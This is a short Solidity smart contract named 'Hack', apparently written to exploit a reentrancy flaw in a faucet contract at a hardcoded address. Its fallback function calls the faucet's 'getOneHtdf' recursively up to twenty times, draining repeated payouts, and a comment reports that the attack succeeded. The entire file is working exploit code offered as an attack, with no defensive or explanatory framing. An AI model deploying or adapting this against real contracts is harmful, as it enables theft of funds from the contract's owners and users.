// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.8.0 <0.9.0;

import "./htd.sol";

contract Hack {

    HtdfFaucet public faucet;
    uint256 public stackDepth = 0;
    address public addr;
    address public owner;
    uint8 MAX_DEPTH = 20;

    constructor(){
    	// 此处也可以由构造函数参数传入
        addr = address(0xA1Cc02b6C3E4B57B82A7Bbd012d6D513C4f929E0);
        faucet = HtdfFaucet(addr);
        owner = msg.sender;
    }

    // test pass, attack succeed!
    function  doHack() public {
        stackDepth = 0;
        faucet.getOneHtdf();
    }

    // fallback function
    fallback() external {
        stackDepth += 1;
        if(stackDepth <= MAX_DEPTH) {
            faucet.getOneHtdf();
        }
    }

}